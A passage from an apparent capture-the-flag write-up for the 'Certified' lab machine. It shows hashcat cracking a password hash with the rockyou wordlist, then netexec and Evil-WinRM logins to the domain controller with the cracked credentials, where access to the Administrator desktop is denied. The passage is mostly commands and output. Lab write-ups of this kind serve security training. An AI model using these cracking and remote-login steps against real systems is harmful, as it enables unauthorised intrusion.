Time.Started.....: Sun May 18 14:17:19 2025 (0 secs)
Time.Estimated...: Sun May 18 14:17:19 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   923.1 kH/s (1.70ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 2048/14344385 (0.01%)
Rejected.........: 0/2048 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> lovers1
Hardware.Mon.#1..: Util: 26%

Started: Sun May 18 14:17:04 2025
Stopped: Sun May 18 14:17:20 2025
```

Alright so we've cracked this user and ....

```
┌──(kali㉿kali)-[~]
└─$ nxc winrm 10.129.229.25 -u 'thomas' -p '159357' -x whoami
WINRM       10.129.229.25   5985   CERTIFIED        [*] Windows Server 2022 Build 20348 (name:CERTIFIED) (domain:certified.htb) 
WINRM       10.129.229.25   5985   CERTIFIED        [+] certified.htb\thomas:159357 (Pwn3d!)
WINRM       10.129.229.25   5985   CERTIFIED        [-] Execute command failed, current user: 'certified.htb\thomas' has no 'Invoke' rights to execute command (shell type: cmd)
WINRM       10.129.229.25   5985   CERTIFIED        [+] Executed command (shell type: powershell)
WINRM       10.129.229.25   5985   CERTIFIED        certifieddc\thomas

```

PWN3D!!!

Sadly, this user is only a basic user. Which is, super weird because it was like 10x harder to pull off to get. Maybe this user was only meant to be able to enroll in the Certificate Template??? Either way PWN3D!!!!!!
```
*Evil-WinRM* PS C:\Users\thomas> cd ..
*Evil-WinRM* PS C:\Users> cd Administrator
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
Access is denied
At line:1 char:1
+ cd Desktop
+ ~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\Users\Administrator\Desktop:String) [Set-Location], UnauthorizedAccessException
    + FullyQualifiedErrorId : ItemExistsUnauthorizedAccessError,Microsoft.PowerShell.Commands.SetLocationCommand
Cannot find path 'C:\Users\Administrator\Desktop' because it does not exist.
At line:1 char:1
+ cd Desktop
+ ~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (C:\Users\Administrator\Desktop:String) [Set-Location], ItemNotFoundException
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.SetLocationCommand
```